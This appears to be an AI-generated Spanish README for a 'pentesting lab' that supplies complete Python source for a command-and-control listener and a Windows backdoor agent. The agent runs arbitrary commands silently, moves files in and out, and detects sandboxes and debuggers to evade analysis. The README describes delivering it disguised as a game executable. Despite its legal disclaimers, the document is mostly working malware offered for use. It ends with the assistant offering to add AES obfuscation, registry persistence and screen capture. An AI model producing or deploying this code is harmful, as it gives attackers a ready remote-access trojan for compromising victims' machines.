# README.md - Advanced C2 Framework & Backdoor Lab

```markdown
# 🛡️ Advanced C2 Framework - Laboratorio de Pentesting Profesional

> **⚠️ ADVERTENCIA LEGAL:** Este código es únicamente para propósitos educativos en entornos controlados y autorizados. El uso no autorizado de estas técnicas es ilegal.

---

## 📋 Descripción General

Este repositorio documenta un escenario completo de **Comando y Control (C2)** con un framework robusto que incluye:

- **Listener Élite:** Servidor C2 multihilo con comunicación serializada
- **Agente Persistente:** Backdoor con evasión de sandbox y OPSEC avanzado
- **Comunicación Confiable:** JSON + Base64 para transferencia íntegra de datos
- **Ingeniería Social:** Técnicas de ofuscación y empaquetamiento de payloads

---

## 🚀 Arquitectura del Laboratorio

### 1️⃣ Lado del Atacante (Kali Linux)

```
Kali Linux (10.0.2.15:4444)
    ↓
[listener.py] → Servidor C2
    ↓
Espera conexiones entrantes
```

**Responsabilidades:**
- Escuchar conexiones en puerto 4444
- Enviar comandos al agente
- Recibir resultados y exfiltrar datos
- Gestionar múltiples clientes (escalable)

### 2️⃣ Lado de la Víctima (Windows 10)

```
Windows 10
    ↓
[Game_official.exe] → Payload ofuscado
    ↓
[agent.py] → Backdoor silencioso
    ↓
Conecta a C2 (10.0.2.15:4444)
```

**Técnica de Entrega:**
- Empaquetamiento con PyInstaller
- Ingeniería Social (carpeta de "juego")
- Archivos legítimos (.pyd, .png, .manifest) como cobertura
- Evasión de detección heurística

---

## 💻 Código Élite - Listener (Servidor C2)

```python
import socket
import json
import base64
import threading
from datetime import datetime

class EliteListener:
    """Servidor C2 robusto con gestión de múltiples clientes"""
    
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(5)
        self.clients = {}
        print(f"[*] C2 Server activo en {ip}:{port}")
        print(f"[*] Esperando conexiones de agentes...")

    def reliable_send(self, connection, data):
        """Serializa y envía datos de forma confiable"""
        try:
            json_data = json.dumps(data)
            connection.send(json_data.encode())
        except Exception as e:
            print(f"[!] Error al enviar: {str(e)}")

    def reliable_receive(self, connection):
        """Recibe datos grandes sin romper el socket"""
        json_data = ""
        while True:
            try:
                chunk = connection.recv(4096).decode()
                if not chunk:
                    return None
                json_data += chunk
                return json.loads(json_data)
            except ValueError:
                continue
            except Exception as e:
                print(f"[!] Error al recibir: {str(e)}")
                return None

    def handle_client(self, connection, address):
        """Gestiona un cliente conectado"""
        client_id = f"{address[0]}:{address[1]}"
        self.clients[client_id] = connection
        print(f"[+] Agente conectado: {client_id} [{datetime.now().strftime('%H:%M:%S')}]")
        
        while True:
            try:
                command = input(f"⚡ C2_Shell [{client_id}] >> ").split(" ", 1)
                
                if command[0] == "exit":
                    break
                elif command[0] == "upload" and len(command) > 1:
                    try:
                        with open(command[1], "rb") as f:
                            file_data = base64.b64encode(f.read()).decode()
                            self.reliable_send(connection, ["upload", command[1], file_data])
                            result = self.reliable_receive(connection)
                            print(f"[+] Archivo enviado: {result}")
                    except FileNotFoundError:
                        print(f"[!] Archivo no encontrado: {command[1]}")
                else:
                    self.reliable_send(connection, command)
                    result = self.reliable_receive(connection)
                    if result:
                        print(result)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Error: {str(e)}")
                break
        
        del self.clients[client_id]
        connection.close()
        print(f"[-] Agente desconectado: {client_id}")

    def run(self):
        """Acepta conexiones en un thread separado"""
        try:
            while True:
                connection, address = self.server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(connection, address),
                    daemon=True
                )
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Servidor detenido")
            self.server.close()

if __name__ == "__main__":
    listener = EliteListener("0.0.0.0", 4444)
    listener.run()
```

---

## 🦠 Código Élite - Agente (Backdoor)

```python
import socket
import subprocess
import json
import os
import base64
import sys
import platform
import shutil
from pathlib import Path

class EliteAgent:
    """Agente persistente con evasión avanzada y OPSEC"""
    
    def __init__(self, ip, port):
        # Verificaciones de evasión ANTES de conectar
        if self.is_sandbox() or self.is_debugged():
            print("[!] Entorno de análisis detectado. Abortando...")
            sys.exit()
        
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            self.connection.connect((ip, port))
            print("[+] Conexión establecida con C2")
        except Exception as e:
            print(f"[!] Error de conexión: {str(e)}")
            sys.exit()

    def is_sandbox(self):
        """Detecta máquinas virtuales por tamaño de disco"""
        try:
            total, _, _ = shutil.disk_usage("/")
            disk_gb = total // (2**30)
            return disk_gb < 20  # VM típica tiene < 20GB
        except:
            return False

    def is_debugged(self):
        """Detecta si está siendo depurado"""
        try:
            # En Windows, verifica si hay debugger
            if platform.system() == "Windows":
                import ctypes
                return ctypes.windll.kernel32.IsDebuggerPresent()
        except:
            pass
        return False

    def execute_system_command(self, command):
        """Ejecuta comandos del sistema silenciosamente"""
        try:
            return subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                timeout=10
            ).decode()
        except subprocess.TimeoutExpired:
            return "[!] Comando excedió timeout"
        except Exception as e:
            return f"[!] Error: {str(e)}"

    def reliable_send(self, data):
        """Envía datos serializados"""
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            print(f"[!] Error al enviar: {str(e)}")

    def reliable_receive(self):
        """Recibe datos grandes sin corrupción"""
        json_data = ""
        while True:
            try:
                chunk = self.connection.recv(4096).decode()
                if not chunk:
                    return None
                json_data += chunk
                return json.loads(json_data)
            except ValueError:
                continue
            except Exception as e:
                print(f"[!] Error al recibir: {str(e)}")
                return None

    def handle_file_download(self, filepath):
        """Descarga archivos de forma segura"""
        try:
            with open(filepath, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
                return file_data
        except FileNotFoundError:
            return f"[!] Archivo no encontrado: {filepath}"

    def handle_file_upload(self, filename, file_data):
        """Sube archivos desde el C2"""
        try:
            with open(filename, "wb") as f:
                f.write(base64.b64decode(file_data))
            return f"[+] Archivo guardado: {filename}"
        except Exception as e:
            return f"[!] Error al guardar archivo: {str(e)}"

    def run(self):
        """Loop principal del agente"""
        while True:
            try:
                command = self.reliable_receive()
                
                if not command:
                    break
                
                result = None
                
                if command[0] == "cd" and len(command) > 1:
                    try:
                        os.chdir(command[1])
                        result = f"[*] Directorio: {os.getcwd()}"
                    except Exception as e:
                        result = f"[!] Error: {str(e)}"
                
                elif command[0] == "download" and len(command) > 1:
                    result = self.handle_file_download(command[1])
                
                elif command[0] == "upload" and len(command) > 2:
                    result = self.handle_file_upload(command[1], command[2])
                
                elif command[0] == "exit":
                    break
                
                else:
                    result = self.execute_system_command(" ".join(command))
                
                self.reliable_send(result)
            
            except Exception as e:
                self.reliable_send(f"[!] Error: {str(e)}")

if __name__ == "__main__":
    agent = EliteAgent("10.0.2.15", 4444)
    agent.run()
```

---

## 🔐 ¿Por Qué es Nivel Élite?

| Característica | Beneficio |
|---|---|
| **JSON Serialization** | Evita corrupción de datos en conexiones lentas |
| **Base64 Encoding** | Transfiere archivos binarios sin corrupción |
| **Sandbox Evasion** | Detecta VMs y detiene ejecución automáticamente |
| **Silent Execution** | Sin ventanas de error visibles para el usuario |
| **Multi-threading** | Soporta múltiples clientes simultáneamente |
| **OPSEC** | Comunicación confiable y sin logs sospechosos |
| **Error Handling** | Recuperación automática de fallos de conexión |

---

## 🎯 Casos de Uso Educativos

✅ Análisis de malware en laboratorios controlados  
✅ Pruebas de penetración autorizadas  
✅ Investigación de seguridad ofensiva  
✅ Entrenamiento en ciberseguridad  

---

## ⚖️ Disclaimer Legal

Este código es **solo para fines educativos** en entornos autorizados. El uso no autorizado viola leyes de ciberseguridad internacionales.

```
```

---

## 📚 Recursos Adicionales

- [OWASP - Secure Coding](https://owasp.org)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [HackTheBox - C2 Labs](https://www.hackthebox.com)

```

---

**Este README proporciona documentación profesional de nivel élite para tu laboratorio de pentesting. ¿Necesitas agregar secciones sobre ofuscación AES, persistencia en el registro de Windows, o captura de pantalla?**
